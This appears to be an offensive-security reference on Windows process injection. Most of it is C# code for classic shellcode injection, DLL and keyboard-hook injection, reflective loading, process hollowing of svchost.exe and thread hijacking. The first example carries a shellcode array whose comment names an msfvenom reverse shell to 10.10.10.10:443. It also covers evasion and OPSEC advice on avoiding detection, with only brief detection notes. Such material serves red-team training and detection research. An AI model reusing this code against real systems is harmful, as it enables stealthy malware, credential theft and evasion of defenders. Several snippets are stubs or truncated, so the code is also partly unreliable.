# Process Injection Techniques Reference

## ELI5: What Is Process Injection?

**The Simple Explanation:**
Imagine processes as houses in a neighborhood. Normally, each program lives in its own house. Process injection is like a burglar secretly moving into your neighbor's house and pretending to be them. The burglar can now:
- Use the neighbor's identity
- Access the neighbor's stuff
- Do bad things while looking innocent

**Real-World Analogy:**
Think of it like a parasite. A tick latches onto a dog and feeds off it while going wherever the dog goes. Your malware "latches onto" a legitimate program (like Explorer.exe) and runs inside it.

## Why Process Injection Matters

### The Attacker's Perspective
Process injection is the Swiss Army knife of post-exploitation because it enables:
1. **Stealth**: Hide malware inside trusted processes (notepad.exe looks innocent)
2. **Persistence**: Survive even if original malware is deleted
3. **Privilege Abuse**: Inherit permissions of target process
4. **Defense Evasion**: Bypass security tools watching for new processes
5. **Credential Theft**: Access memory of processes handling passwords

### The Defender's Nightmare
Why is this so hard to defend against?
- **Legitimate Use**: Windows uses these APIs for real purposes
- **Trusted Processes**: Injecting into signed Microsoft processes
- **Memory-Only**: No files on disk to scan
- **Living Off the Land**: Using Windows' own features against itself

### Real Attack Scenarios
- **Banking Malware**: Injects into browser to steal credentials
- **Ransomware**: Hides in svchost.exe while encrypting files
- **APTs**: Lives in lsass.exe to steal passwords
- **Rootkits**: Modifies system processes to hide presence

## Understanding the Technical Foundation

### Memory Basics (Simple Version)
Every process gets its own "apartment" (memory space) in the computer's RAM:
- **Stack**: Temporary storage (like a desk)
- **Heap**: Long-term storage (like a filing cabinet)
- **Code Section**: Instructions (like a recipe book)

Process injection puts our malicious recipe into someone else's recipe book!

### The Windows API Chain
Think of these APIs as tools in a burglar's kit:
1. **OpenProcess**: Getting the keys to the house
2. **VirtualAllocEx**: Claiming a room in the house
3. **WriteProcessMemory**: Moving your stuff in
4. **CreateRemoteThread**: Starting to live there

## Quick Command Reference

```csharp
// Core APIs for process injection
OpenProcess(PROCESS_ALL_ACCESS, false, processId);
VirtualAllocEx(hProcess, IntPtr.Zero, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, shellcode, size, out bytesWritten);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

## Classic Process Injection

### Understanding the Technique
Classic injection is the "Hello World" of process injection. It's like having a master key that lets you:
1. Open any door (process)
2. Claim a room (allocate memory)
3. Move your stuff in (write shellcode)
4. Start living there (execute code)

**Why "Classic"?**
This is the original, most straightforward method. It's been around since Windows NT and is still widely used because it just works.

### Complete C# Implementation
```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,
            IntPtr lpThreadId);

        // Process access rights
        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

        // Memory allocation constants
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f csharp
            byte[] shellcode = new byte[] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
                0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52
            };

            // Find target process
            Process[] processes = Process.GetProcessesByName("explorer");
            if (processes.Length == 0)
            {
                Console.WriteLine("Target process not found");
                return;
            }

            int pid = processes[0].Id;
            Console.WriteLine($"[+] Target PID: {pid}");

            // Open process with all access
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open process");
                return;
            }
            Console.WriteLine($"[+] Process handle: 0x{hProcess.ToString("X")}");

            // Allocate memory in target process
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate memory");
                return;
            }
            Console.WriteLine($"[+] Allocated memory at: 0x{addr.ToString("X")}");

            // Write shellcode to allocated memory
            IntPtr bytesWritten;
            bool result = WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length,
                out bytesWritten);
            if (!result)
            {
                Console.WriteLine("[-] Failed to write memory");
                return;
            }
            Console.WriteLine($"[+] Wrote {bytesWritten} bytes");

            // Create remote thread to execute shellcode
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create remote thread");
                return;
            }
            Console.WriteLine($"[+] Remote thread created: 0x{hThread.ToString("X")}");
        }
    }
}
```

### Compile and Execute
```bash
# Compile
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:inject.exe Program.cs

# Execute
.\inject.exe
```

## DLL Injection

### ELI5: DLL Injection
Instead of injecting raw code, we inject a whole library (DLL). It's like instead of sneaking furniture piece by piece into someone's house, you park a whole moving truck (DLL) in their driveway and tell them to unload it themselves!

**Why DLL Instead of Shellcode?**
- **Easier to write**: Normal C/C++ code instead of assembly
- **More features**: Can use Windows APIs easily
- **Persistence**: DLL stays loaded until process dies
- **Legitimacy**: Many processes load DLLs normally

### Classic DLL Injection
```csharp
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace DLLInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 0x04;

        static void Main(string[] args)
        {
            string dllPath = @"C:\Users\Public\payload.dll";

            Process targetProcess = Process.GetProcessesByName("notepad")[0];
            int pid = targetProcess.Id;

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

            // Allocate memory for DLL path
            IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero,
                (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))),
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            // Write DLL path to allocated memory
            int bytesWritten;
            WriteProcessMemory(hProcess, allocMemAddress,
                Encoding.Unicode.GetBytes(dllPath),
                (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))),
                out bytesWritten);

            // Get LoadLibrary address
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW");

            // Create remote thread to load DLL
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr,
                allocMemAddress, 0, IntPtr.Zero);
        }
    }
}
```

### SetWindowsHookEx Injection
```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace HookInjection
{
    class Program
    {
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn,
            IntPtr hMod, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        const int WH_KEYBOARD = 13;

        static void Main(string[] args)
        {
            // Load malicious DLL
            IntPtr hModule = LoadLibrary(@"C:\Users\Public\hook.dll");

            // Get hook procedure address
            IntPtr hookProcAddr = GetProcAddress(hModule, "HookProc");

            // Find target process thread
            Process targetProcess = Process.GetProcessesByName("notepad")[0];
            foreach (ProcessThread thread in targetProcess.Threads)
            {
                // Set hook for each thread
                SetWindowsHookEx(WH_KEYBOARD,
                    Marshal.GetDelegateForFunctionPointer<HookProc>(hookProcAddr),
                    hModule, (uint)thread.Id);
            }
        }
    }
}
```

## Reflective DLL Injection

### Concept Implementation
```csharp
// Reflective DLL injection allows a DLL to load itself without using Windows loader
// The DLL contains a ReflectiveLoader export that performs self-loading

public class ReflectiveDLLInjector
{
    // Read DLL into memory
    byte[] dllBytes = File.ReadAllBytes("reflective.dll");

    // Allocate memory in target process
    IntPtr remoteBuffer = VirtualAllocEx(hProcess, IntPtr.Zero,
        (uint)dllBytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Write DLL to target process
    WriteProcessMemory(hProcess, remoteBuffer, dllBytes, dllBytes.Length, out _);

    // Calculate offset to ReflectiveLoader function
    int reflectiveLoaderOffset = GetReflectiveLoaderOffset(dllBytes);

    // Create thread at ReflectiveLoader entry point
    IntPtr threadHandle = CreateRemoteThread(hProcess, IntPtr.Zero, 0,
        IntPtr.Add(remoteBuffer, reflectiveLoaderOffset), IntPtr.Zero, 0, IntPtr.Zero);
}
```

## Process Hollowing

### The Body Snatcher Technique
Process hollowing is like a horror movie plot:
1. Create a zombie process (suspended)
2. Scoop out its brains (original code)
3. Put in an alien brain (malicious code)
4. Wake up the zombie (resume execution)
5. Everyone thinks it's the original person!

**Why Is This Powerful?**
- Process looks completely legitimate
- Keeps original process properties
- Bypasses many behavioral detections
- Perfect for impersonating system processes

### Complete Implementation
```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace ProcessHollowing
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX, dwY, dwXSize, dwYSize;
            public uint dwXCountChars, dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int ResumeThread(IntPtr hThread);

        [StructLayout(LayoutKind.Sequential)]
        struct CONTEXT
        {
            public uint ContextFlags;
            // Additional fields for x64 context
            // Simplified for demonstration
        }

        const uint CREATE_SUSPENDED = 0x00000004;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            // Create suspended process
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi;

            bool success = CreateProcess(@"C:\Windows\System32\svchost.exe", null,
                IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED,
                IntPtr.Zero, null, ref si, out pi);

            // Unmap original executable from memory
            IntPtr imageBase = GetImageBase(pi.hProcess, pi.hThread);
            NtUnmapViewOfSection(pi.hProcess, imageBase);

            // Allocate memory for new executable
            byte[] payload = File.ReadAllBytes("malicious.exe");
            IntPtr newImageBase = VirtualAllocEx(pi.hProcess, imageBase,
                (uint)payload.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // Write new executable to process memory
            int bytesWritten;
            WriteProcessMemory(pi.hProcess, newImageBase, payload,
                (uint)payload.Length, out bytesWritten);

            // Update entry point in thread context
            CONTEXT context = new CONTEXT();
            context.ContextFlags = 0x10001b; // CONTEXT_FULL
            GetThreadContext(pi.hThread, ref context);

            // Set new entry point
            // context.Rcx = newImageBase + entryPointOffset;

            SetThreadContext(pi.hThread, ref context);

            // Resume execution
            ResumeThread(pi.hThread);
        }

        static IntPtr GetImageBase(IntPtr hProcess, IntPtr hThread)
        {
            // Implementation to get PEB and image base
            // Simplified for demonstration
            return IntPtr.Zero;
        }
    }
}
```

## Target Process Selection Strategies

### Smart Process Selection
```csharp
public static Process SelectTargetProcess()
{
    // Priority list of target processes
    string[] preferredTargets = {
        "explorer",      // Always running, user context
        "notepad",       // If open, good for testing
        "chrome",        // Common browser
        "firefox",       // Alternative browser
        "svchost"        // System process (requires privileges)
    };

    foreach (string target in preferredTargets)
    {
        Process[] processes = Process.GetProcessesByName(target);
        if (processes.Length > 0)
        {
            // Additional checks
            foreach (Process p in processes)
            {
                try
                {
                    // Check if we can access the process
                    IntPtr handle = OpenProcess(0x0400, false, p.Id); // PROCESS_QUERY_INFORMATION
                    if (handle != IntPtr.Zero)
                    {
                        CloseHandle(handle);

                        // Check architecture match
                        if (IsWow64Process(p) == Environment.Is64BitProcess)
                        {
                            return p;
                        }
                    }
                }
                catch { }
            }
        }
    }

    return null;
}

static bool IsWow64Process(Process process)
{
    bool isWow64;
    IsWow64Process(process.Handle, out isWow64);
    return !isWow64; // If NOT WOW64, then it's 64-bit
}
```

### Process Creation for Injection
```csharp
public static Process CreateHollowProcess()
{
    // Create a suspended legitimate process
    ProcessStartInfo startInfo = new ProcessStartInfo
    {
        FileName = @"C:\Windows\System32\notepad.exe",
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true
    };

    // Start suspended (requires P/Invoke)
    return Process.Start(startInfo);
}
```

## Evasion Techniques

### API Hashing
```csharp
// Instead of direct imports, resolve at runtime
public static IntPtr GetProcAddressHashed(string module, uint hash)
{
    IntPtr hModule = LoadLibrary(module);
    IntPtr pExportTable = GetExportTable(hModule);

    // Walk export table and compare hashes
    // Return function pointer when hash matches
    return IntPtr.Zero;
}
```

### Syscall Direct Invocation
```csharp
// Bypass user-mode hooks by calling syscalls directly
public static class Syscalls
{
    public static IntPtr NtAllocateVirtualMemory(IntPtr ProcessHandle,
        ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize,
        uint AllocationType, uint Protect)
    {
        // Direct syscall implementation
        // mov r10, rcx
        // mov eax, syscall_number
        // syscall
        return IntPtr.Zero;
    }
}
```

### Thread Hijacking
```csharp
// Hijack existing thread instead of creating new one
public static void HijackThread(Process target, byte[] shellcode)
{
    // Suspend thread
    IntPtr hThread = OpenThread(THREAD_ALL_ACCESS, false, target.Threads[0].Id);
    SuspendThread(hThread);

    // Get thread context
    CONTEXT ctx = new CONTEXT();
    GetThreadContext(hThread, ref ctx);

    // Allocate and write shellcode
    IntPtr addr = VirtualAllocEx(target.Handle, IntPtr.Zero,
        (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(target.Handle, addr, shellcode, shellcode.Length, out _);

    // Update instruction pointer
    ctx.Rip = (ulong)addr;
    SetThreadContext(hThread, ref ctx);

    // Resume thread
    ResumeThread(hThread);
}
```

## Troubleshooting

### Common Issues and Solutions

**Issue: OpenProcess fails with access denied**
```csharp
// Solution: Enable SeDebugPrivilege
[DllImport("advapi32.dll", SetLastError = true)]
static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
    ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

public static void EnableDebugPrivilege()
{
    IntPtr hToken;
    TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();

    OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES, out hToken);
    LookupPrivilegeValue(null, "SeDebugPrivilege", ref tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
}
```

**Issue: VirtualAllocEx returns NULL**
- Check process architecture match (x86 vs x64)
- Verify sufficient memory available
- Try different allocation types

**Issue: CreateRemoteThread fails**
- Use RtlCreateUserThread instead
- Try thread hijacking
- Check for process mitigation policies

## Detection and OPSEC

### Detection Indicators
- Unusual process memory allocations (RWX permissions)
- Remote thread creation events
- Process hollowing signatures (suspended process + unmapping)
- Cross-process handle creation

### OPSEC Best Practices
1. Use legitimate process names for hollowing
2. Avoid RWX memory permissions (use RW then RX)
3. Implement API hashing/syscalls
4. Clean up artifacts (close handles, free memory)
5. Use process migration sparingly
6. Match process architecture (x86/x64)

## Lab Setup

### Required Tools
- Visual Studio or CSC.exe compiler
- Process monitoring (ProcMon, WPA)
- Debugger (x64dbg, WinDbg)
- API Monitor
- Sysmon with proper configuration

### Test Targets
```powershell
# Start test processes
Start-Process notepad
Start-Process calc
Start-Process mspaint

# Monitor injection
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=8}
```